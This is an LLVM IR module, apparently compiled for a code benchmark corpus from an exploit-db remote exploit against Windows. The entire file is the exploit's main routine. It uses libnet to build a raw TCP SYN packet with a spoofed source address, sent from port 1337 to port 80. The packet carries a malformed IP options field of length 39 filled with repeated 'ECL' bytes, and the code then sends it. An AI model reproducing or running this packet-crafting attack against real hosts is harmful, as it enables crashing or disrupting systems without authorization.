; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_25384.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_25384.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ip = type { i32, i32, i32, i32, %struct.TYPE_4__, %struct.TYPE_3__, i64, i32, i8*, i8*, i64 }
%struct.TYPE_4__ = type { i32 }
%struct.TYPE_3__ = type { i32 }
%struct.tcphdr = type { i32, i32, i64, i64, i32, i64, i64, i64, i8*, i8* }

@LIBNET_ERRBUF_SIZE = common dso_local global i32 0, align 4
@LIBNET_RAW4 = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"libnet_init() failed: %s\00", align 1
@LIBNET_RESOLVE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"Unresolved source address\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"Unresolved destination address\0A\00", align 1
@IP_MAXPACKET = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"ECL\00", align 1
@IP_H = common dso_local global i32 0, align 4
@IPOPTS_MAX = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@TH_SYN = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [17 x i8] c"Write error: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"Packet sent.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.ip*, align 8
  %14 = alloca %struct.tcphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* @LIBNET_ERRBUF_SIZE, align 4
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %6, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %7, align 8
  store i8* null, i8** %9, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %21 = call i32 (...) @banner()
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 4
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @usage(i8* %27)
  br label %29

29:                                               ; preds = %24, %2
  %30 = load i32, i32* @LIBNET_RAW4, align 4
  %31 = load i8*, i8** %9, align 8
  %32 = call i32* @libnet_init(i32 %30, i8* %31, i8* %20)
  store i32* %32, i32** %8, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %38

34:                                               ; preds = %29
  %35 = load i32, i32* @stderr, align 4
  %36 = call i32 (i32, i8*, ...) @fprintf(i32 %35, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %20)
  %37 = call i32 @exit(i32 -1) #4
  unreachable

38:                                               ; preds = %29
  %39 = load i32*, i32** %8, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = load i32, i32* @LIBNET_RESOLVE, align 4
  %44 = call i32 @libnet_name2addr4(i32* %39, i8* %42, i32 %43)
  store i32 %44, i32* %15, align 4
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %46, label %50

46:                                               ; preds = %38
  %47 = load i32, i32* @stderr, align 4
  %48 = call i32 (i32, i8*, ...) @fprintf(i32 %47, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %49 = call i32 @exit(i32 -1) #4
  unreachable

50:                                               ; preds = %38
  %51 = load i32*, i32** %8, align 8
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 2
  %54 = load i8*, i8** %53, align 8
  %55 = load i32, i32* @LIBNET_RESOLVE, align 4
  %56 = call i32 @libnet_name2addr4(i32* %51, i8* %54, i32 %55)
  store i32 %56, i32* %16, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %62

58:                                               ; preds = %50
  %59 = load i32, i32* @stderr, align 4
  %60 = call i32 (i32, i8*, ...) @fprintf(i32 %59, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  %61 = call i32 @exit(i32 -1) #4
  unreachable

62:                                               ; preds = %50
  %63 = load i32, i32* @IP_MAXPACKET, align 4
  %64 = call i32* @malloc(i32 %63)
  store i32* %64, i32** %11, align 8
  %65 = icmp eq i32* %64, null
  br i1 %65, label %66, label %69

66:                                               ; preds = %62
  %67 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %68 = call i32 @exit(i32 -1) #4
  unreachable

69:                                               ; preds = %62
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 3
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @atoi(i8* %72)
  %74 = load i32*, i32** %11, align 8
  %75 = getelementptr inbounds i32, i32* %74, i64 20
  store i32 %73, i32* %75, align 4
  %76 = load i32*, i32** %11, align 8
  %77 = getelementptr inbounds i32, i32* %76, i64 21
  store i32 39, i32* %77, align 4
  store i32 0, i32* %10, align 4
  br label %78

78:                                               ; preds = %88, %69
  %79 = load i32, i32* %10, align 4
  %80 = icmp slt i32 %79, 38
  br i1 %80, label %81, label %91

81:                                               ; preds = %78
  %82 = load i32*, i32** %11, align 8
  %83 = load i32, i32* %10, align 4
  %84 = add nsw i32 22, %83
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i32, i32* %82, i64 %85
  %87 = call i32 @strncpy(i32* %86, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32 3)
  br label %88

88:                                               ; preds = %81
  %89 = load i32, i32* %10, align 4
  %90 = add nsw i32 %89, 3
  store i32 %90, i32* %10, align 4
  br label %78

91:                                               ; preds = %78
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* @IP_H, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  %96 = load i32, i32* @IPOPTS_MAX, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  %99 = bitcast i32* %98 to %struct.tcphdr*
  store %struct.tcphdr* %99, %struct.tcphdr** %14, align 8
  %100 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %101 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %100, i32 0, i32 0
  store i32 5, i32* %101, align 8
  %102 = load i32, i32* @IP_H, align 4
  %103 = load i32, i32* @IPOPTS_MAX, align 4
  %104 = add nsw i32 %102, %103
  %105 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = shl i32 %107, 2
  %109 = add nsw i32 %104, %108
  store i32 %109, i32* %12, align 4
  %110 = call i32 @time(i32* null)
  %111 = call i32 @srand(i32 %110)
  %112 = load i32*, i32** %11, align 8
  %113 = bitcast i32* %112 to %struct.ip*
  store %struct.ip* %113, %struct.ip** %13, align 8
  %114 = load %struct.ip*, %struct.ip** %13, align 8
  %115 = getelementptr inbounds %struct.ip, %struct.ip* %114, i32 0, i32 0
  store i32 4, i32* %115, align 8
  %116 = load i32, i32* @IPOPTS_MAX, align 4
  %117 = sdiv i32 %116, 4
  %118 = add nsw i32 5, %117
  %119 = load %struct.ip*, %struct.ip** %13, align 8
  %120 = getelementptr inbounds %struct.ip, %struct.ip* %119, i32 0, i32 1
  store i32 %118, i32* %120, align 4
  %121 = load %struct.ip*, %struct.ip** %13, align 8
  %122 = getelementptr inbounds %struct.ip, %struct.ip* %121, i32 0, i32 10
  store i64 0, i64* %122, align 8
  %123 = load i32, i32* %12, align 4
  %124 = call i8* @htons(i32 %123)
  %125 = load %struct.ip*, %struct.ip** %13, align 8
  %126 = getelementptr inbounds %struct.ip, %struct.ip* %125, i32 0, i32 9
  store i8* %124, i8** %126, align 8
  %127 = call i32 (...) @rand()
  %128 = load %struct.ip*, %struct.ip** %13, align 8
  %129 = getelementptr inbounds %struct.ip, %struct.ip* %128, i32 0, i32 2
  store i32 %127, i32* %129, align 8
  %130 = call i8* @htons(i32 0)
  %131 = load %struct.ip*, %struct.ip** %13, align 8
  %132 = getelementptr inbounds %struct.ip, %struct.ip* %131, i32 0, i32 8
  store i8* %130, i8** %132, align 8
  %133 = load %struct.ip*, %struct.ip** %13, align 8
  %134 = getelementptr inbounds %struct.ip, %struct.ip* %133, i32 0, i32 3
  store i32 64, i32* %134, align 4
  %135 = load i32, i32* @IPPROTO_TCP, align 4
  %136 = load %struct.ip*, %struct.ip** %13, align 8
  %137 = getelementptr inbounds %struct.ip, %struct.ip* %136, i32 0, i32 7
  store i32 %135, i32* %137, align 8
  %138 = load %struct.ip*, %struct.ip** %13, align 8
  %139 = getelementptr inbounds %struct.ip, %struct.ip* %138, i32 0, i32 6
  store i64 0, i64* %139, align 8
  %140 = load i32, i32* %15, align 4
  %141 = load %struct.ip*, %struct.ip** %13, align 8
  %142 = getelementptr inbounds %struct.ip, %struct.ip* %141, i32 0, i32 5
  %143 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %142, i32 0, i32 0
  store i32 %140, i32* %143, align 4
  %144 = load i32, i32* %16, align 4
  %145 = load %struct.ip*, %struct.ip** %13, align 8
  %146 = getelementptr inbounds %struct.ip, %struct.ip* %145, i32 0, i32 4
  %147 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %146, i32 0, i32 0
  store i32 %144, i32* %147, align 8
  %148 = call i8* @htons(i32 1337)
  %149 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 9
  store i8* %148, i8** %150, align 8
  %151 = call i8* @htons(i32 80)
  %152 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %153 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %152, i32 0, i32 8
  store i8* %151, i8** %153, align 8
  %154 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 7
  store i64 0, i64* %155, align 8
  %156 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %157 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %156, i32 0, i32 6
  store i64 0, i64* %157, align 8
  %158 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %159 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %158, i32 0, i32 5
  store i64 0, i64* %159, align 8
  %160 = load i32, i32* @TH_SYN, align 4
  %161 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %162 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %161, i32 0, i32 4
  store i32 %160, i32* %162, align 8
  %163 = call i32 (...) @rand()
  %164 = and i32 %163, 65535
  %165 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %166 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %165, i32 0, i32 1
  store i32 %164, i32* %166, align 4
  %167 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %168 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %167, i32 0, i32 3
  store i64 0, i64* %168, align 8
  %169 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 2
  store i64 0, i64* %170, align 8
  %171 = load i32*, i32** %8, align 8
  %172 = load i32*, i32** %11, align 8
  %173 = load i32, i32* @IPPROTO_TCP, align 4
  %174 = load %struct.tcphdr*, %struct.tcphdr** %14, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = shl i32 %176, 2
  %178 = call i32 @libnet_do_checksum(i32* %171, i32* %172, i32 %173, i32 %177)
  %179 = load i32*, i32** %8, align 8
  %180 = load i32*, i32** %11, align 8
  %181 = load i32, i32* %12, align 4
  %182 = call i32 @libnet_write_raw_ipv4(i32* %179, i32* %180, i32 %181)
  store i32 %182, i32* %10, align 4
  %183 = icmp eq i32 %182, -1
  br i1 %183, label %184, label %190

184:                                              ; preds = %91
  %185 = load i32, i32* @stderr, align 4
  %186 = load i32*, i32** %8, align 8
  %187 = call i8* @libnet_geterror(i32* %186)
  %188 = call i32 (i32, i8*, ...) @fprintf(i32 %185, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i8* %187)
  %189 = call i32 @exit(i32 -1) #4
  unreachable

190:                                              ; preds = %91
  %191 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  %192 = load i32*, i32** %8, align 8
  %193 = call i32 @libnet_destroy(i32* %192)
  %194 = load i32*, i32** %11, align 8
  %195 = call i32 @free(i32* %194)
  store i32 0, i32* %3, align 4
  %196 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %196)
  %197 = load i32, i32* %3, align 4
  ret i32 %197
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @banner(...) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i32* @libnet_init(i32, i8*, i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @libnet_name2addr4(i32*, i8*, i32) #2

declare dso_local i32* @malloc(i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strncpy(i32*, i8*, i32) #2

declare dso_local i32 @srand(i32) #2

declare dso_local i32 @time(i32*) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @libnet_do_checksum(i32*, i32*, i32, i32) #2

declare dso_local i32 @libnet_write_raw_ipv4(i32*, i32*, i32) #2

declare dso_local i8* @libnet_geterror(i32*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @libnet_destroy(i32*) #2

declare dso_local i32 @free(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
